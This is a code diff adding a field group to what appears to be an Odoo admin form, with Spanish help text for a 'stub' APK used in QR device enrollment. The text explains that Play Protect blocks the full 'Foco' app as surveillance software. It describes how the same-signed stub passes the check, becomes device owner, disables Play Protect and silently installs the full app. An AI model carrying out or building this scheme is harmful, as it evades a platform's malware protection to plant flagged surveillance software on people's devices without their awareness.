@@ -525,6 +525,21 @@
                             permitir instalar de origen desconocido.
                         </div>
                     </group>
+                    <group string="APK de alta (stub) para el QR">
+                        <field name="mobile_stub_apk" filename="mobile_stub_apk_name"/>
+                        <field name="mobile_stub_apk_name"/>
+                        <field name="mobile_stub_apk_version_code"/>
+                        <div class="text-muted" colspan="2">
+                            Google Play Protect BLOQUEA el Foco completo al instalarlo
+                            por QR (micro, llamadas, accesibilidad = «app de vigilancia»).
+                            El stub es una app MINIMA, con la MISMA firma y el mismo
+                            paquete, que si pasa Play Protect: queda de dueño del equipo,
+                            apaga Play Protect y baja/instala el Foco completo en silencio.
+                            El QR de alta apunta su descarga a este stub; el Foco completo
+                            lo baja el stub solo. Sube el stub firmado con la misma llave
+                            y con un versionCode MENOR que el del Foco completo.
+                        </div>
+                    </group>
                 </sheet>
             </form>
         </field>
